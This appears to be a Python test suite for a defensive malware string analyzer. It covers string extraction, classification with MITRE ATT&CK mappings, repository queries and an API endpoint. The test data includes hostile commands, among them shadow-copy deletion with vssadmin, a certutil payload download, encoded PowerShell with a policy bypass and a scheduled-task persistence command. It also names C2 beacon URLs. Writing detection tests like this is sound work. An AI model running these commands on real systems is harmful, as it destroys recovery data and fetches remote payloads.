"""
Test Suite: String Intelligence & Forensic Analyzer (Module 06)

Validates:
1. Static ASCII and UTF-16LE Unicode string extraction with exact byte offsets.
2. Forensic categorization (URL, DOMAIN, IP_ADDRESS, REGISTRY, COMMAND, POWERSHELL, CMD, SCRIPT, DLL, API, SUSPICIOUS, GENERAL).
3. Defensive suspicion engine with severity, confidence, reasons, and MITRE ATT&CK mappings.
4. Database persistence and query capabilities in SampleRepository.
5. REST API endpoint GET /api/analyses/{analysis_id}/strings with filtering, pagination, search, and statistics.
6. Error handling, authorization constraints, and non-execution safety.
"""

import os
import sys
import unittest
from datetime import datetime, timezone

sys.path.insert(0, os.path.abspath("."))

from app.analyzers.string_analyzer import (
    StringAnalyzer,
    StringAnalysisResult,
    ExtractedStringItem,
    string_analyzer_service,
)
from app.db.session import Base, engine, SessionLocal, init_db
from app.db.models import SampleModel, StringModel, UserModel
from app.auth.roles import UserRole
from app.db.schemas import StringCreate, SampleCreate
from app.db.repository import SampleRepository
from fastapi.testclient import TestClient
from app.main import app


class TestStringIntelligenceEngine(unittest.TestCase):
    """
    Unit and integration tests for StringAnalyzer and intelligence classification.
    """

    def setUp(self):
        self.analyzer = StringAnalyzer(min_length=4)

    def test_ascii_extraction_with_offset(self):
        """Validates ASCII string extraction with accurate byte offsets."""
        dummy_data = b"\x00\x00\x00\x00Hello_World_Defensive_Tool\x00\x00\x00"
        result = self.analyzer.analyze_bytes(dummy_data)
        
        self.assertTrue(result.is_valid)
        self.assertGreaterEqual(result.total_strings, 1)
        self.assertGreaterEqual(result.ascii_count, 1)
        
        item = next((i for i in result.items if "Hello_World" in i.value), None)
        self.assertIsNotNone(item)
        self.assertEqual(item.encoding, "ASCII")
        self.assertEqual(item.offset, 4)
        self.assertEqual(item.offset_hex, "0x00000004")

    def test_unicode_utf16le_extraction_with_offset(self):
        """Validates UTF-16LE wide string extraction with accurate byte offsets."""
        text = "Ethio_Security_2026"
        encoded = text.encode("utf-16le")
        dummy_data = b"\x90\x90\x90\x90" + encoded + b"\x00\x00"
        result = self.analyzer.analyze_bytes(dummy_data)

        self.assertTrue(result.is_valid)
        self.assertGreaterEqual(result.unicode_count, 1)

        item = next((i for i in result.items if "Ethio_Security" in i.value), None)
        self.assertIsNotNone(item)
        self.assertEqual(item.encoding, "UTF-16LE")
        self.assertEqual(item.offset, 4)
        self.assertEqual(item.offset_hex, "0x00000004")

    def test_powershell_and_cmd_classification(self):
        """Validates classification of PowerShell and Windows Command shell strings."""
        ps_payload = b"powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgA"
        cmd_payload = b"cmd.exe /c whoami.exe"
        data = ps_payload + b"\x00\x00" + cmd_payload

        result = self.analyzer.analyze_bytes(data)
        self.assertGreaterEqual(result.suspicious_count, 2)

        ps_item = next((i for i in result.items if "powershell" in i.value.lower()), None)
        self.assertIsNotNone(ps_item)
        self.assertEqual(ps_item.category, "POWERSHELL")
        self.assertTrue(ps_item.suspicious)
        self.assertIn(ps_item.severity, ("HIGH", "CRITICAL"))
        self.assertEqual(ps_item.mitre_id, "T1059.001")

        cmd_item = next((i for i in result.items if "cmd.exe" in i.value.lower()), None)
        self.assertIsNotNone(cmd_item)
        self.assertEqual(cmd_item.category, "CMD")
        self.assertTrue(cmd_item.suspicious)
        self.assertEqual(cmd_item.mitre_id, "T1059.003")

    def test_recovery_tampering_and_discovery_commands(self):
        """Validates detection of vssadmin, certutil, and administrative CLI commands."""
        data = b"vssadmin.exe delete shadows /all /quiet\x00\x00schtasks /create /tn EvilTask\x00\x00certutil -urlcache -split -f http://test.com/payload.exe"
        result = self.analyzer.analyze_bytes(data)

        vss_item = next((i for i in result.items if "vssadmin" in i.value.lower()), None)
        self.assertIsNotNone(vss_item)
        self.assertEqual(vss_item.category, "COMMAND")
        self.assertTrue(vss_item.suspicious)
        self.assertEqual(vss_item.severity, "HIGH")
        self.assertEqual(vss_item.mitre_id, "T1490")

        sch_item = next((i for i in result.items if "schtasks" in i.value.lower()), None)
        self.assertIsNotNone(sch_item)
        self.assertEqual(sch_item.mitre_id, "T1053.005")

    def test_registry_autorun_persistence_detection(self):
        """Validates detection of registry persistence keys."""
        run_key = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor"
        clean_key = b"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows"
        data = run_key + b"\x00\x00" + clean_key

        result = self.analyzer.analyze_bytes(data)

        run_item = next((i for i in result.items if "CurrentVersion\\Run" in i.value), None)
        self.assertIsNotNone(run_item)
        self.assertEqual(run_item.category, "REGISTRY")
        self.assertTrue(run_item.suspicious)
        self.assertEqual(run_item.severity, "HIGH")
        self.assertEqual(run_item.mitre_id, "T1547.001")

        clean_item = next((i for i in result.items if "Policies" in i.value), None)
        self.assertIsNotNone(clean_item)
        self.assertEqual(clean_item.category, "REGISTRY")
        self.assertFalse(clean_item.suspicious)

    def test_security_critical_apis_detection(self):
        """Validates detection of memory injection and API primitives."""
        apis_data = b"VirtualAlloc\x00\x00CreateRemoteThread\x00\x00URLDownloadToFileA\x00\x00IsDebuggerPresent\x00\x00LoadLibraryA"
        result = self.analyzer.analyze_bytes(apis_data)

        va_item = next((i for i in result.items if i.value == "VirtualAlloc"), None)
        self.assertIsNotNone(va_item)
        self.assertEqual(va_item.category, "API")
        self.assertTrue(va_item.suspicious)
        self.assertEqual(va_item.mitre_id, "T1055")

        crt_item = next((i for i in result.items if i.value == "CreateRemoteThread"), None)
        self.assertIsNotNone(crt_item)
        self.assertEqual(crt_item.severity, "CRITICAL")
        self.assertEqual(crt_item.mitre_id, "T1055.002")

        url_item = next((i for i in result.items if i.value == "URLDownloadToFileA"), None)
        self.assertIsNotNone(url_item)
        self.assertEqual(url_item.mitre_id, "T1105")

        dbg_item = next((i for i in result.items if i.value == "IsDebuggerPresent"), None)
        self.assertIsNotNone(dbg_item)
        self.assertEqual(dbg_item.mitre_id, "T1622")

    def test_network_endpoints_urls_and_ips(self):
        """Validates extraction of URLs and IP addresses."""
        data = b"http://185.220.101.5:8080/stage2.bin\x00\x00https://api.github.com/repos\x00\x00192.168.1.100\x00\x00127.0.0.1"
        result = self.analyzer.analyze_bytes(data)

        self.assertGreaterEqual(len(result.urls), 2)
        self.assertGreaterEqual(len(result.ip_addresses), 1)

        # Loopback IP should be INFO severity and not suspicious
        loopback_item = next((i for i in result.items if i.value == "127.0.0.1"), None)
        self.assertIsNotNone(loopback_item)
        self.assertFalse(loopback_item.suspicious)
        self.assertEqual(loopback_item.severity, "INFO")


class TestStringDatabaseRepository(unittest.TestCase):
    """
    Database persistence and querying tests for strings intelligence.
    """

    def setUp(self):
        init_db()
        self.db = SessionLocal()

        # Create a test sample
        self.sample = SampleModel(
            analysis_id=f"ANL-STR-TEST-{int(datetime.now().timestamp() * 1000)}",
            filename="strings_sample_target.exe",
            sha256="d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2",
            md5="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
            sha1="1234567890abcdef1234567890abcdef12345678",
            size=40960,
            file_type="PE32 executable (GUI) Intel 80386, for MS Windows",
            status="COMPLETED",
            classification="SUSPICIOUS",
            risk_score=65,
        )
        self.db.add(self.sample)
        self.db.commit()
        self.db.refresh(self.sample)

        # Add sample strings with various categories
        test_strings = [
            StringModel(
                sample_id=self.sample.id,
                value="http://malicious-c2.com/beacon",
                encoding="ASCII",
                offset=0x1000,
                category="URL",
                type="URL",
                suspicious=True,
                severity="HIGH",
                confidence=0.95,
                reason="Direct outbound HTTP beacon URL",
                mitre_technique="Web Protocols"
            ),
            StringModel(
                sample_id=self.sample.id,
                value="185.220.101.5",
                encoding="ASCII",
                offset=0x1050,
                category="IP_ADDRESS",
                type="IP_ADDRESS",
                suspicious=True,
                severity="MEDIUM",
                confidence=0.90,
                reason="External routable IPv4 destination",
                mitre_technique="Application Layer Protocol"
            ),
            StringModel(
                sample_id=self.sample.id,
                value="powershell.exe -ExecutionPolicy Bypass -enc ABC==",
                encoding="UTF-16LE",
                offset=0x1100,
                category="POWERSHELL",
                type="POWERSHELL",
                suspicious=True,
                severity="HIGH",
                confidence=0.92,
                reason="PowerShell execution indicator",
                mitre_technique="Command and Scripting Interpreter: PowerShell"
            ),
            StringModel(
                sample_id=self.sample.id,
                value="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                encoding="ASCII",
                offset=0x1200,
                category="REGISTRY",
                type="REGISTRY_PATH",
                suspicious=True,
                severity="HIGH",
                confidence=0.90,
                reason="Registry autorun key",
                mitre_technique="Registry Run Keys"
            ),
            StringModel(
                sample_id=self.sample.id,
                value="KERNEL32.dll",
                encoding="ASCII",
                offset=0x1300,
                category="DLL",
                type="DLL",
                suspicious=False,
                severity="INFO",
                confidence=1.0,
                reason="Standard Dynamic Link Library",
                mitre_technique="Shared Modules"
            ),
            StringModel(
                sample_id=self.sample.id,
                value="Hello World Defender Application",
                encoding="ASCII",
                offset=0x1400,
                category="GENERAL",
                type="GENERAL",
                suspicious=False,
                severity="INFO",
                confidence=1.0,
                reason="Standard binary text"
            ),
        ]
        self.db.add_all(test_strings)
        self.db.commit()

    def tearDown(self):
        self.db.query(StringModel).filter(StringModel.sample_id == self.sample.id).delete()
        self.db.query(SampleModel).filter(SampleModel.id == self.sample.id).delete()
        self.db.commit()
        self.db.close()

    def test_repository_get_strings_and_filtering(self):
        """Tests repository query filtering and pagination."""
        # 1. Total unfiltered
        all_strs = SampleRepository.get_strings_for_sample(self.db, self.sample.id, skip=0, limit=100)
        self.assertEqual(len(all_strs), 6)

        # 2. Suspicious only
        susp_strs = SampleRepository.get_strings_for_sample(self.db, self.sample.id, suspicious_only=True)
        self.assertEqual(len(susp_strs), 4)

        # 3. Category filter
        url_strs = SampleRepository.get_strings_for_sample(self.db, self.sample.id, category="URL")
        self.assertEqual(len(url_strs), 1)
        self.assertEqual(url_strs[0].category, "URL")

        ps_strs = SampleRepository.get_strings_for_sample(self.db, self.sample.id, category="POWERSHELL")
        self.assertEqual(len(ps_strs), 1)

        # 4. Search query
        search_results = SampleRepository.get_strings_for_sample(self.db, self.sample.id, search="powershell")
        self.assertEqual(len(search_results), 1)

        # 5. Encoding filter
        unicode_results = SampleRepository.get_strings_for_sample(self.db, self.sample.id, encoding="UTF-16LE")
        self.assertEqual(len(unicode_results), 1)

    def test_repository_statistics_aggregation(self):
        """Tests aggregated summary statistics calculations."""
        stats = SampleRepository.get_string_statistics_for_sample(self.db, self.sample.id)
        self.assertEqual(stats["total"], 6)
        self.assertEqual(stats["suspicious_count"], 4)
        self.assertEqual(stats["urls_count"], 1)
        self.assertEqual(stats["ips_count"], 1)
        self.assertEqual(stats["powershell_count"], 1)
        self.assertEqual(stats["registry_count"], 1)
        self.assertEqual(stats["dlls_count"], 1)
        self.assertEqual(stats["ascii_count"], 5)
        self.assertEqual(stats["unicode_count"], 1)


class TestStringIntelligenceApi(unittest.TestCase):
    """
    Integration tests for the GET /api/analyses/{analysis_id}/strings REST endpoint.
    """

    def setUp(self):
        init_db()
        self.client = TestClient(app)
        self.db = SessionLocal()

        self.analysis_id = f"ANL-API-STR-{int(datetime.now().timestamp() * 1000)}"
        self.sample = SampleModel(
            analysis_id=self.analysis_id,
            filename="sample_for_api_test.exe",
            sha256="11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff",
            md5="11223344556677889900aabbccddeeff",
            sha1="11223344556677889900aabbccddeeff11223344",
            size=16384,
            status="COMPLETED",
            classification="SUSPICIOUS",
            risk_score=55,
        )
        self.db.add(self.sample)
        self.db.commit()
        self.db.refresh(self.sample)

        # Add 10 sample strings
        for i in range(10):
            st = StringModel(
                sample_id=self.sample.id,
                value=f"http://api-test-domain-{i}.com/path",
                encoding="ASCII",
                offset=0x1000 + (i * 0x10),
                category="URL",
                type="URL",
                suspicious=(i % 2 == 0),
                severity="HIGH" if (i % 2 == 0) else "LOW",
                confidence=0.9,
                reason=f"Test string entry {i}"
            )
            self.db.add(st)
        self.db.commit()

    def tearDown(self):
        self.db.query(StringModel).filter(StringModel.sample_id == self.sample.id).delete()
        self.db.query(SampleModel).filter(SampleModel.id == self.sample.id).delete()
        self.db.commit()
        self.db.close()

    def test_get_strings_success(self):
        """Tests successful retrieval of strings with statistics and metadata."""
        resp = self.client.get(f"/api/analyses/{self.analysis_id}/strings")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()

        self.assertEqual(data["analysis_id"], self.analysis_id)
        self.assertEqual(data["filename"], "sample_for_api_test.exe")
        self.assertEqual(data["total_strings"], 10)
        self.assertEqual(data["filtered_total"], 10)
        self.assertEqual(len(data["strings"]), 10)
        self.assertIn("statistics", data)
        self.assertIn("ai_string_summary", data)

        # Verify item structure
        first_item = data["strings"][0]
        self.assertIn("value", first_item)
        self.assertIn("encoding", first_item)
        self.assertIn("offset_hex", first_item)
        self.assertIn("category", first_item)
        self.assertIn("suspicious", first_item)
        self.assertIn("severity", first_item)
        self.assertIn("reason", first_item)

    def test_get_strings_pagination(self):
        """Tests pagination parameters on the strings endpoint."""
        resp = self.client.get(f"/api/analyses/{self.analysis_id}/strings?page=1&page_size=4")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()

        self.assertEqual(data["page"], 1)
        self.assertEqual(data["page_size"], 4)
        self.assertEqual(data["total_pages"], 3)
        self.assertEqual(len(data["strings"]), 4)

    def test_get_strings_suspicious_filter(self):
        """Tests filtering by suspicious_only=true."""
        resp = self.client.get(f"/api/analyses/{self.analysis_id}/strings?suspicious_only=true")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()

        self.assertEqual(data["filtered_total"], 5)
        for s in data["strings"]:
            self.assertTrue(s["suspicious"])

    def test_get_strings_not_found(self):
        """Tests 404 response for nonexistent analysis ID."""
        resp = self.client.get("/api/analyses/NON_EXISTENT_ANALYSIS_ID_9999/strings")
        self.assertEqual(resp.status_code, 404)


if __name__ == "__main__":
    unittest.main()
